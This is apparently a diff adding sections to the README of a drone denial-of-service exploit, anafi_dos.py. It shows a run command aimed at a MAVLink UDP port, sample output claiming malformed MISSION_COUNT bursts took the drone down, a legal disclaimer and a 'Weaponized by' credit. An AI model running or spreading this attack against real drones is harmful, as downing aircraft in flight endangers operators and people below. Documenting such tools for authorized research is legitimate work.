@@ -59,3 +59,21 @@ python3 anafi_dos.py --ip 192.168.42.1 --port 14550 --protocol udp --burst 25 --
 
 ```
 ---
+## Example Output (Successful DoS)
+```bash
+12:34:56 [INFO] Attempting UDP connection to 192.168.42.1:14550...
+12:34:57 [INFO] Connected! System ID: 1, Component ID: 1
+12:34:57 [INFO] Launching DoS burst: 25 malformed MISSION_COUNT messages...
+12:34:59 [CRITICAL] No heartbeat received - DoS SUCCESSFUL!
+12:35:00 [CRITICAL] Exploit successful - drone is down!
+```
+---
+## Disclaimer
+This tool is for authorized security testing and educational purposes only.
+Unauthorized use against drones you do not own is illegal under FAA, EASA, JCAR, Jordanian cybersecurity laws, and international aviation regulations.
+The author assumes no liability for any misuse or damage.
+
+
+## Weaponized by
+Mohammed Idrees Banyamer – Jordanian Cybersecurity Researcher
+@banyamer_security | GitHub
